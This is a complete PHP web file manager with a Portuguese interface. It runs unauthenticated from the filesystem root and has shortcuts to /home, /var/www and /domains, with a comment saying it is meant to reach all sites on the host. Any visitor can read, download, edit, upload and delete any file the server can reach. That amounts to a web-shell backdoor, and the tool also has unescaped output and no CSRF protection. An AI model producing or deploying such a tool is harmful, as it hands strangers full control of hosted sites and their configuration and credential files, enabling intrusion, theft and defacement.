<?php
session_start();

// Manipular requisição AJAX para conteúdo do arquivo ANTES de qualquer output
if (isset($_GET['get_file_content'])) {
    $filePath = $_GET['get_file_content'];
    if (file_exists($filePath) && is_readable($filePath) && is_file($filePath)) {
        header('Content-Type: text/plain; charset=utf-8');
        $content = file_get_contents($filePath);
        // Garantir que o conteúdo seja válido UTF-8
        if ($content !== false) {
            echo $content;
        } else {
            http_response_code(500);
            echo 'Erro ao ler o arquivo';
        }
    } else {
        http_response_code(404);
        echo 'Arquivo não encontrado ou não é legível';
    }
    exit;
}

// Configurações básicas
$baseDir = '/'; // Diretório raiz para acessar todos os sites
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : $baseDir;
$currentDir = realpath($currentDir) ?: $baseDir;

// Configuração para mostrar diretórios comuns de hospedagem
$commonDirs = [
    '/home' => '🏠 Diretório Home',
    '/var/www' => '🌐 Sites Web',
    '/var/www/html' => '📁 HTML Público',
    '/public_html' => '🌍 Public HTML',
    '/www' => '💻 WWW',
    '/domains' => '🔗 Domínios'
];

// Função para verificar se um diretório existe e é acessível
function isAccessible($dir) {
    return is_dir($dir) && is_readable($dir);
}

// Função para formatar tamanho de arquivo
function formatBytes($size, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $base = log($size, 1024);
    return round(pow(1024, $base - floor($base)), $precision) . ' ' . $units[floor($base)];
}

// Função para obter ícone do arquivo
function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '⚡',
        'txt' => '📄', 'md' => '📝', 'json' => '📋', 'xml' => '📄',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️',
        'pdf' => '📕', 'doc' => '📘', 'docx' => '📘',
        'zip' => '📦', 'rar' => '📦', '7z' => '📦',
        'mp3' => '🎵', 'mp4' => '🎬', 'avi' => '🎬'
    ];
    return isset($icons[$ext]) ? $icons[$ext] : '📄';
}

// Processar ações
if ($_POST) {
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'delete':
                $filePath = $_POST['path'];
                if (file_exists($filePath)) {
                    if (is_dir($filePath)) {
                        rmdir($filePath);
                    } else {
                        unlink($filePath);
                    }
                    $message = "Arquivo/pasta removido com sucesso!";
                }
                break;
                
            case 'save':
                $filePath = $_POST['file_path'];
                $content = $_POST['content'];
                file_put_contents($filePath, $content);
                $message = "Arquivo salvo com sucesso!";
                break;
                
            case 'create_file':
                $fileName = $_POST['file_name'];
                $filePath = $currentDir . '/' . $fileName;
                file_put_contents($filePath, '');
                $message = "Arquivo criado com sucesso!";
                break;
                
            case 'create_folder':
                $folderName = $_POST['folder_name'];
                $folderPath = $currentDir . '/' . $folderName;
                mkdir($folderPath);
                $message = "Pasta criada com sucesso!";
                break;
                
            case 'upload':
                if (isset($_FILES['upload_file'])) {
                    $uploadPath = $currentDir . '/' . $_FILES['upload_file']['name'];
                    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $uploadPath)) {
                        $message = "Arquivo enviado com sucesso!";
                    } else {
                        $message = "Erro ao enviar arquivo!";
                    }
                }
                break;
        }
    }
}

// Download de arquivo
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// Listar arquivos
$files = array();
$folders = array();
$accessError = false;

if (is_dir($currentDir)) {
    if (is_readable($currentDir)) {
        $items = scandir($currentDir);
        foreach ($items as $item) {
            if ($item != '.' && $item != '..') {
                $fullPath = $currentDir . '/' . $item;
                if (is_dir($fullPath)) {
                    $folders[] = $item;
                } else {
                    $files[] = $item;
                }
            }
        }
    } else {
        $accessError = true;
    }
} else {
    $accessError = true;
}

sort($folders);
sort($files);
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gerenciador de Arquivos</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            overflow: hidden;
        }

        .header {
            background: #2c3e50;
            color: white;
            padding: 20px;
            text-align: center;
        }

        .header h1 {
            margin-bottom: 10px;
        }

        .breadcrumb {
            background: #34495e;
            color: white;
            padding: 15px 20px;
            font-family: monospace;
            word-break: break-all;
        }

        .actions {
            padding: 20px;
            background: #ecf0f1;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            align-items: center;
        }

        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: #3498db;
            color: white;
        }

        .btn-primary:hover {
            background: #2980b9;
        }

        .btn-success {
            background: #27ae60;
            color: white;
        }

        .btn-success:hover {
            background: #229954;
        }

        .btn-danger {
            background: #e74c3c;
            color: white;
        }

        .btn-danger:hover {
            background: #c0392b;
        }

        .btn-warning {
            background: #f39c12;
            color: white;
        }

        .btn-warning:hover {
            background: #e67e22;
        }

        .file-list {
            padding: 20px;
        }

        .file-item {
            display: flex;
            align-items: center;
            padding: 12px;
            border-bottom: 1px solid #eee;
            transition: background 0.2s ease;
        }

        .file-item:hover {
            background: #f8f9fa;
        }

        .file-icon {
            font-size: 24px;
            margin-right: 15px;
            min-width: 30px;
        }

        .file-info {
            flex: 1;
        }

        .file-name {
            font-weight: bold;
            margin-bottom: 4px;
        }

        .file-details {
            font-size: 12px;
            color: #666;
        }

        .file-actions {
            display: flex;
            gap: 8px;
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
        }

        .modal-content {
            background: white;
            margin: 5% auto;
            padding: 20px;
            border-radius: 10px;
            width: 90%;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover {
            color: black;
        }

        textarea {
            width: 100%;
            height: 400px;
            font-family: monospace;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            resize: vertical;
        }

        input[type="text"], input[type="file"] {
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-right: 10px;
        }

        .message {
            background: #d4edda;
            color: #155724;
            padding: 10px;
            margin: 20px;
            border-radius: 5px;
            border: 1px solid #c3e6cb;
        }

        .folder-icon {
            color: #f39c12;
        }

        @media (max-width: 768px) {
            .actions {
                flex-direction: column;
                align-items: stretch;
            }
            
            .btn {
                text-align: center;
                margin-bottom: 5px;
            }
            
            .file-item {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .file-actions {
                margin-top: 10px;
                width: 100%;
                justify-content: flex-start;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🗂️ Gerenciador de Arquivos PHP</h1>
            <p>Gerencie seus arquivos facilmente</p>
        </div>

        <div class="breadcrumb">
            📁 <?php echo $currentDir; ?>
            <?php if (is_readable($currentDir)): ?>
                <span style="color: #2ecc71; margin-left: 10px;">✓ Acessível</span>
            <?php else: ?>
                <span style="color: #e74c3c; margin-left: 10px;">✗ Sem permissão</span>
            <?php endif; ?>
        </div>

        <?php if (isset($message)): ?>
            <div class="message"><?php echo $message; ?></div>
        <?php endif; ?>

        <div class="actions">
            <!-- Atalhos para diretórios comuns -->
            <div style="width: 100%; margin-bottom: 15px;">
                <strong>🚀 Atalhos Rápidos:</strong><br>
                <?php foreach ($commonDirs as $dir => $label): ?>
                    <?php if (isAccessible($dir)): ?>
                        <a href="?dir=<?php echo urlencode($dir); ?>" class="btn btn-primary" style="margin: 2px;"><?php echo $label; ?></a>
                    <?php endif; ?>
                <?php endforeach; ?>
            </div>
            
            <?php if ($currentDir != $baseDir): ?>
                <a href="?dir=<?php echo urlencode(dirname($currentDir)); ?>" class="btn btn-primary">⬅️ Voltar</a>
            <?php endif; ?>
            
            <button onclick="showModal('createFileModal')" class="btn btn-success">📄 Novo Arquivo</button>
            <button onclick="showModal('createFolderModal')" class="btn btn-success">📁 Nova Pasta</button>
            <button onclick="showModal('uploadModal')" class="btn btn-warning">⬆️ Upload</button>
            <a href="?" class="btn btn-primary">🔄 Atualizar</a>
        </div>

        <div class="file-list">
            <?php if ($accessError): ?>
                <div class="file-item" style="background: #ffe6e6; border-left: 4px solid #e74c3c;">
                    <div class="file-icon">⚠️</div>
                    <div class="file-info">
                        <div class="file-name" style="color: #c0392b;">Acesso Negado</div>
                        <div class="file-details">Você não tem permissão para acessar este diretório ou ele não existe.</div>
                    </div>
                </div>
            <?php endif; ?>
            
            <?php foreach ($folders as $folder): ?>
                <div class="file-item">
                    <div class="file-icon folder-icon">📁</div>
                    <div class="file-info">
                        <div class="file-name"><?php echo htmlspecialchars($folder); ?></div>
                        <div class="file-details">
                            Pasta
                            <?php 
                                $folderPath = $currentDir . '/' . $folder;
                                if (is_readable($folderPath)) {
                                    echo ' - <span style="color: #27ae60;">Acessível</span>';
                                } else {
                                    echo ' - <span style="color: #e74c3c;">Sem permissão</span>';
                                }
                            ?>
                        </div>
                    </div>
                    <div class="file-actions">
                        <a href="?dir=<?php echo urlencode($currentDir . '/' . $folder); ?>" class="btn btn-primary">Abrir</a>
                        <?php if (is_writable($currentDir)): ?>
                            <button onclick="deleteItem('<?php echo $currentDir . '/' . $folder; ?>')" class="btn btn-danger">Remover</button>
                        <?php endif; ?>
                    </div>
                </div>
            <?php endforeach; ?>

            <?php foreach ($files as $file): ?>
                <?php 
                    $filePath = $currentDir . '/' . $file;
                    $fileSize = filesize($filePath);
                    $fileDate = date('d/m/Y H:i', filemtime($filePath));
                ?>
                <div class="file-item">
                    <div class="file-icon"><?php echo getFileIcon($file); ?></div>
                    <div class="file-info">
                        <div class="file-name"><?php echo htmlspecialchars($file); ?></div>
                        <div class="file-details">
                            <?php echo formatBytes($fileSize) . ' - ' . $fileDate; ?>
                            <?php if (is_readable($filePath)): ?>
                                <span style="color: #27ae60;"> - Legível</span>
                            <?php endif; ?>
                            <?php if (is_writable($filePath)): ?>
                                <span style="color: #f39c12;"> - Editável</span>
                            <?php endif; ?>
                        </div>
                    </div>
                    <div class="file-actions">
                        <?php if (is_readable($filePath) && $fileSize < 1024*1024): // Só permite editar arquivos menores que 1MB ?>
                            <button onclick="editFile('<?php echo $filePath; ?>')" class="btn btn-warning">Editar</button>
                        <?php endif; ?>
                        <?php if (is_readable($filePath)): ?>
                            <a href="?download=<?php echo urlencode($filePath); ?>" class="btn btn-primary">Download</a>
                        <?php endif; ?>
                        <?php if (is_writable(dirname($filePath))): ?>
                            <button onclick="deleteItem('<?php echo $filePath; ?>')" class="btn btn-danger">Remover</button>
                        <?php endif; ?>
                    </div>
                </div>
            <?php endforeach; ?>

            <?php if (empty($folders) && empty($files)): ?>
                <div class="file-item">
                    <div class="file-info">
                        <div class="file-name">Pasta vazia</div>
                        <div class="file-details">Nenhum arquivo ou pasta encontrada</div>
                    </div>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Modal para criar arquivo -->
    <div id="createFileModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>Criar Novo Arquivo</h2>
            <form method="POST">
                <input type="hidden" name="action" value="create_file">
                <input type="text" name="file_name" placeholder="Nome do arquivo" required>
                <button type="submit" class="btn btn-success">Criar</button>
            </form>
        </div>
    </div>

    <!-- Modal para criar pasta -->
    <div id="createFolderModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>Criar Nova Pasta</h2>
            <form method="POST">
                <input type="hidden" name="action" value="create_folder">
                <input type="text" name="folder_name" placeholder="Nome da pasta" required>
                <button type="submit" class="btn btn-success">Criar</button>
            </form>
        </div>
    </div>

    <!-- Modal para upload -->
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>Upload de Arquivo</h2>
            <form method="POST" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <input type="file" name="upload_file" required>
                <button type="submit" class="btn btn-success">Upload</button>
            </form>
        </div>
    </div>

    <!-- Modal para editar arquivo -->
    <div id="editModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>Editar Arquivo</h2>
            <form method="POST">
                <input type="hidden" name="action" value="save">
                <input type="hidden" name="file_path" id="edit_file_path">
                <textarea name="content" id="edit_content"></textarea>
                <br><br>
                <button type="submit" class="btn btn-success">Salvar</button>
            </form>
        </div>
    </div>

    <script>
        function showModal(modalId) {
            document.getElementById(modalId).style.display = 'block';
        }

        function hideModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        // Fechar modais
        document.querySelectorAll('.close').forEach(closeBtn => {
            closeBtn.onclick = function() {
                this.closest('.modal').style.display = 'none';
            }
        });

        // Fechar modal clicando fora
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                event.target.style.display = 'none';
            }
        }

        function deleteItem(path) {
            if (confirm('Tem certeza que deseja remover este item?')) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.innerHTML = `
                    <input type="hidden" name="action" value="delete">
                    <input type="hidden" name="path" value="${path}">
                `;
                document.body.appendChild(form);
                form.submit();
            }
        }

        function editFile(filePath) {
            // Fazer requisição para obter conteúdo do arquivo
            const xhr = new XMLHttpRequest();
            xhr.open('GET', '?get_file_content=' + encodeURIComponent(filePath), true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        document.getElementById('edit_file_path').value = filePath;
                        document.getElementById('edit_content').value = xhr.responseText;
                        showModal('editModal');
                    } else {
                        alert('Erro ao carregar o arquivo: ' + xhr.statusText);
                    }
                }
            };
            xhr.send();
        }
    </script>
</body>
</html>